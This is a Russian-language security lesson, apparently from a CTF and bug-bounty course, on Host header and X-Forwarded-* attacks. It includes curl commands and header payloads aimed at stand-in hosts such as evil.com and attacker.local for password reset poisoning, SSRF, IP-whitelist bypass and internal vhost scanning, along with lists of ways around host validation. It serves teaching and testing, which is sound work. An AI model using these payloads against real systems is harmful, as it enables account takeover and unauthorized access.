---
id: web-host-header
title: "Host header и X-Forwarded атаки"
category: web
parent: web-waf-parsing-attacks
difficulty: hard
order: 2
tags: [host-header, x-forwarded-host, password-reset, vhost, routing, cache]
prerequisites: [web-waf-bypass]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 45
summary: "Как заголовок Host и X-Forwarded-* ломают сброс пароля, роутинг, кэш и контроль доступа."
---

Заголовок `Host` говорит серверу, какой сайт запрашивается (виртуальный хостинг). Приложения часто **доверяют** ему — строят из него ссылки, выбирают маршрут, проверяют домен. А ещё есть `X-Forwarded-Host`, `X-Forwarded-For`, `X-Forwarded-Proto`, которым приложение доверяет «потому что так настроен прокси». Если доверие безусловно, атакующий подменяет эти заголовки и получает массу эффектов.

## Теория: что можно сломать через Host

1. **Password reset poisoning.** Письмо для сброса пароля содержит ссылку вида `https://<Host>/reset?token=...`. Если сервер берёт `<Host>` из запроса, атакующий подставляет свой домен и получает токен жертвы:
   ```
   POST /forgot  Host: evil.com
   -> жертве уходит https://evil.com/reset?token=SECRET
   ```
2. **Кэш-poisoning.** Ответ, зависящий от Host, может закэшироваться и отдаваться другим (см. `web-cache-poisoning`).
3. **Обход контроля доступа / роутинг.** Внутренние хосты (`admin.internal`) могут быть доступны, если подставить их в Host.
4. **Инъекция в ссылки/редиректы.** `Location`/`Set-Cookie`/абсолютные URL строятся из Host → open redirect, cookie injection.
5. **SSRF через vhost.** Некоторые прокси маршрутизируют по Host на внутренние сервисы.
6. **Server-side request routing:** подмена `X-Forwarded-Host` может переключить приложение на другой «тенант».

`X-Forwarded-*` особенно опасны, если приложение доверяет им, даже когда запрос пришёл напрямую (без прокси): `X-Forwarded-For: 127.0.0.1` → обход IP-whitelist; `X-Forwarded-Host: evil.com` → тот же password-reset poisoning.

## Теория: как проверять

Отправьте запрос с изменённым `Host` (или `X-Forwarded-Host`) и посмотрите, отразится ли он в теле/заголовках/письмах. Затем проверьте цепочки:

- Абсолютные URL в HTML (`https://<Host>/...`).
- `Location` в редиректах.
- `Set-Cookie` с `Domain=<Host>`.
- Ссылки в письмах (сброс пароля, приглашение).
- Ответы внутренних vhost.

## Инструменты: curl и Burp

Прямая подмена Host (к IP, с указанием чужого Host):

```bash
curl -s -i https://target.local/ --resolve target.local:443:203.0.113.10 -H 'Host: evil.com'
```

Проверка отражения Host в теле:

```bash
curl -s https://target.local/ -H 'Host: evil.com' | grep -o 'https://evil.com[^"]*'
```

Проверка `X-Forwarded-Host`:

```bash
curl -s -i https://target.local/ -H 'X-Forwarded-Host: evil.com' | grep -iE 'location|set-cookie'
```

Проверка внутреннего vhost:

```bash
curl -s -i https://203.0.113.10/ -H 'Host: admin.internal' | head -20
```

В **Burp** — Repeater с правкой `Host`/`X-Forwarded-Host`, а также расширение **Host Header Injection Checker**.

## Разобранный пример: password reset poisoning → захват аккаунта

Шаг 1. Находим форму сброса пароля и пробуем подмену Host на своём аккаунте:

```bash
curl -s -X POST https://app.local/forgot -H 'Host: evil.com' \
  -H 'Content-Type: application/x-www-form-urlencoded' -d 'email=me@mydomain.com'
```

Шаг 2. Получаем письмо (на свой ящик) и смотрим ссылку:

```
https://evil.com/reset?token=ABC123
```

Если домен в ссылке — `evil.com`, значит сервер использует Host из запроса. На своём аккаунте это доказывает уязвимость.

Шаг 3. Impact: атакующий запускает сброс для жертвы с `Host: evil.com`, жертва кликает по письму (домен выглядит… правда, тут домен атакующего — фишинг), и токен уходит атакующему → **захват аккаунта**. В отчёте важно показать именно утечку токена на чужой домен.

Шаг 4. Пробуем обходы валидации Host, если сервер что-то проверяет:

```
Host: evil.com
Host: target.local.evil.com
Host: evil.com#target.local
Host: target.local:evil.com
X-Forwarded-Host: evil.com
X-Forwarded-Host: target.local, evil.com
```

## Разобранный пример: обход IP-whitelist через X-Forwarded-For

Если админка доступна только с внутренних IP:

```bash
curl -s -i https://app.local/admin -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Real-IP: 127.0.0.1'
```

Если вернулось содержимое админки — приложение доверяет `X-Forwarded-For` без проверки, что запрос пришёл от прокси. Это обход контроля доступа.

## Разобранный пример: vhost routing

Шаг 1. Сканируем внутренние имена через Host:

```bash
for h in admin.internal localhost internal.target.local; do
  echo -n "$h -> "; curl -s -o /dev/null -w '%{http_code}\n' https://203.0.113.10/ -H "Host: $h"
done
```

Шаг 2. Если `admin.internal` вернул `200`/`302` (а не 404), возможно, найден внутренний сервис. Дальше — изучение его функциональности (в рамках scope).

## Частые ошибки

- **Смотреть только `Host`.** `X-Forwarded-Host`, `X-Forwarded-For`, `X-Forwarded-Proto`, `X-Original-URL`, `X-Rewrite-URL` тоже опасны.
- **Не проверять письма.** Password-reset poisoning проявляется именно в ссылке письма; тестируйте на своём ящике.
- **Путать с vhost-фаззингом.** Host-атаки — про доверие к значению, а не только про перебор имён.
- **Забывать про кэш.** Ответ, зависящий от Host, может отравить кэш (см. `web-cache-poisoning`).
- **Тестировать чужой аккаунт.** Для reset poisoning используйте свой email; не отправляйте сброс жертве.
- **Игнорировать прямой запрос.** `X-Forwarded-For` работает, если сервер доверяет ему без прокси.

## Полный разбор: password reset poisoning end-to-end (с выводом)

Шаг 1. Находим форму сброса и проверяем, отражается ли Host в ссылке (на своём аккаунте):

```bash
curl -s -X POST 'https://app.local/forgot' \
  -H 'Host: evil.com' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'email=me@mydomain.com'
```

Шаг 2. Смотрим письмо на своём ящике — ссылка сброса:

```
https://evil.com/reset?token=ABC123DEF
```

Домен = `evil.com` → сервер строит ссылку из `Host`. Уязвимость подтверждена на своём аккаунте.

Шаг 3. Проверяем `X-Forwarded-Host` (если `Host` валидируется строго, но `XFH` — нет):

```bash
curl -s -X POST 'https://app.local/forgot' \
  -H 'X-Forwarded-Host: evil.com' -d 'email=me@mydomain.com'
```

Шаг 4. Impact-цепочка: атакующий инициирует сброс для **жертвы** с `Host: evil.com`, жертва получает письмо со ссылкой на домен атакующего (домен в письме может выглядеть как часть пути/фишинг), кликает → `token` уходит на `evil.com` → **захват аккаунта**. В отчёте покажите, что токен утёк на чужой хост (не атакуйте чужой аккаунт — используйте свой и опишите цепочку).

Шаг 5. Обходы валидации Host, если она есть:

```text
Host: target.local.evil.com
Host: evil.com#target.local
Host: evil.com@target.local
Host: target.local:evil.com
Host: target.local:80
X-Forwarded-Host: evil.com
X-Forwarded-Host: target.local, evil.com
X-Forwarded-Host: evil.com/target.local
X-Host: evil.com
X-Original-URL: /forgot
```

## Reference-таблица: заголовки и эффекты

| Заголовок | Эффект при доверии |
|-----------|--------------------|
| `Host` | reset poisoning, cache poisoning, vhost routing |
| `X-Forwarded-Host` | то же, чаще не валидируется |
| `X-Forwarded-For` | обход IP-whitelist (админки, debug) |
| `X-Real-IP` / `X-Client-IP` | обход IP-whitelist |
| `X-Forwarded-Proto` | подмена схемы (http/https) → insecure link, SSRF |
| `X-Original-URL` / `X-Rewrite-URL` | обход роутинга/доступа |
| `X-Forwarded-Port` | подмена порта в ссылках |
| `Forwarded` (RFC 7239) | комбинированный, иногда парсится |

## Обход валидации Host и X-Forwarded-*

Разработчики часто «валидируют» Host нестрого:

- **Суффикс:** `endsWith('target.local')` → `evil-target.local`, `target.local.evil.com`.
- **Префикс:** `startsWith('target.local')` → `target.local.evil.com`.
- **Регистр/порт:** `TARGET.LOCAL`, `target.local:evil`.
- **`@`-трюк:** `evil.com@target.local` (разные парсеры дают разный хост).
- **`#`/`?`:** `evil.com#target.local`, `evil.com?x=target.local`.
- **Множественные значения:** `X-Forwarded-Host: target.local, evil.com` — берут первое/последнее.
- **IPv6/подчёркивания:** `[::1]`, `target_local` (некоторые парсеры нормализуют).
- **Отсутствие заголовка:** некоторые приложения при пустом `Host`/`XFH` используют значение по умолчанию — проверяйте.

Всегда проверяйте каждую цепочку: валидатор может смотреть на `Host`, а ссылку строить из `X-Forwarded-Host` (или наоборот) — расхождение и есть баг.

## Что делать дальше / решение

1. **Найти точки, зависящие от Host**: reset/confirm ссылки, редиректы, `Set-Cookie Domain`, абсолютные URL.
2. **Подменить `Host`** на своём аккаунте и посмотреть письмо/редирект.
3. **Проверить `X-Forwarded-*`** (Host/For/Proto/Port) — часто не валидируются.
4. **Обойти валидацию** (суффикс/префикс/`@`/`#`/множественные значения).
5. **Проверить IP-whitelist** через `X-Forwarded-For: 127.0.0.1`.
6. **Учесть кэш** — ответ, зависящий от Host, может отравить кэш.
7. **Оформить PoC** (письмо/редирект) на своём аккаунте, без атаки на чужой.

## Host-атаки и SSRF/cache: связка

Host/X-Forwarded-заголовки — это не изолированный класс, а усилитель других атак:

- **+ Cache poisoning:** если ответ зависит от `X-Forwarded-Host`, а кэш его не учитывает (`Vary` без него), отравленный ответ уйдёт всем. Отправьте `X-Forwarded-Host: evil.com` и проверьте `X-Cache: HIT` на чистом запросе (см. `web-cache-poisoning`).
- **+ SSRF:** приложение строит внутренний URL из Host/`X-Forwarded-Host`; подмена уводит запрос на ваш хост (SSRF/OOB).
- **+ Password reset poisoning:** самый известный сценарий (токен на чужой домен).
- **+ Web cache deception:** комбинируется с `X-Forwarded-Host` для кэширования приватного.
- **+ Routing bypass:** `X-Original-URL`/`X-Rewrite-URL` меняют маршрут (доступ к `/admin` через `X-Original-URL: /admin` при внешне заблокированном пути).
- **+ Access control:** `X-Forwarded-For: 127.0.0.1` обходит IP-whitelist.

Порядок теста: подставьте каждый заголовок по отдельности, посмотрите на отражение в теле/`Location`/`Set-Cookie`, затем проверьте эффект на кэш и внутренние адреса. Помните: приложение может доверять заголовку только «от прокси», но если ваш запрос доходит до приложения напрямую (или прокси не перезаписывает заголовок), доверие неоправданно. Именно это расхождение и эксплуатируется.

## Host-заголовок в SSRF и внутренний роутинг

Приложение, которое строит внутренний URL из `Host`/`X-Forwarded-Host`, можно увести на свой сервер (SSRF/OOB):

```bash
curl -s "https://app.local/api/proxy" -H 'X-Forwarded-Host: attacker.local'
# сервер делает запрос на http://attacker.local/... -> видим в логах
```

Также `X-Original-URL: /admin` при заблокированном снаружи `/admin` иногда открывает внутренний маршрут. Проверяйте каждую комбинацию заголовков отдельно и фиксируйте, какой слой её обрабатывает.

## Порядок проверки Host-заголовков

1. Подставить `Host` → посмотреть отражение в теле/`Location`/`Set-Cookie`.
2. Подставить `X-Forwarded-Host` (часто не валидируется).
3. Проверить reset-письмо (ссылка на чужой домен).
4. Проверить `X-Forwarded-For: 127.0.0.1` на админке.
5. Проверить `X-Forwarded-Proto: http` (небезопасные ссылки/SSRF).
6. Проверить `X-Original-URL`/`X-Rewrite-URL` (routing bypass).
7. Связать с кэшем (cache poisoning) и SSRF.

Каждый шаг — отдельная находка; фиксируйте, какой заголовок и какой слой его обрабатывает.

## Квиз

Выберите один вариант в каждом вопросе.

```quiz
- question: "Как Host header injection ведёт к захвату аккаунта?"
  options:
    - "Через SQL-инъекцию"
    - "Через подмену домена в ссылке сброса пароля (poisoning)"
    - "Через XSS"
    - "Через TLS"
  answer: 1
  explanation: "Сервер строит ссылку с токеном из Host → токен уходит на домен атакующего."
- question: "Какой заголовок может обойти IP-whitelist?"
  options:
    - "`Content-Type`"
    - "`X-Forwarded-For`"
    - "`Accept`"
    - "`User-Agent`"
  answer: 1
  explanation: "Если приложение доверяет XFF без проверки прокси, подставляем `127.0.0.1`."
- question: "Что даёт подмена `Host` на внутреннее имя?"
  options:
    - "Ускорение"
    - "Доступ к внутренним vhost-сервисам (роутинг по Host)"
    - "Шифрование трафика"
    - "Кэширование"
  answer: 1
  explanation: "Прокси/приложение могут маршрутизировать на внутренние сервисы."
- question: "Почему опасно доверие `X-Forwarded-Host`?"
  options:
    - "Он не существует"
    - "Приложение строит абсолютные URL/редиректы по нему → open redirect, poisoning"
    - "Он только для IPv6"
    - "Он отключает cookie"
  answer: 1
  explanation: "Как и Host, он влияет на генерацию ссылок."
- question: "Как корректно тестировать password reset poisoning?"
  options:
    - "Отправить сброс жертве"
    - "Использовать свой email и подменить Host, затем посмотреть ссылку в письме"
    - "Запустить сканер"
    - "Проверить `robots.txt`"
  answer: 1
  explanation: "Только свой аккаунт; проверяем домен в ссылке письма."
```

## Где пригодится

- **CTF (Web):** Host-задачи часто про vhost и reset poisoning.
- **Bug bounty:** password reset poisoning — высокооплачиваемый баг; XFF-обход — частый в API.
- **Пентест:** анализ доверия к Host/XFF — часть тестирования прокси и приложений.
- **Работа (AppSec/Dev):** использование настроенного домена вместо Host и валидация XFF — базовая защита.
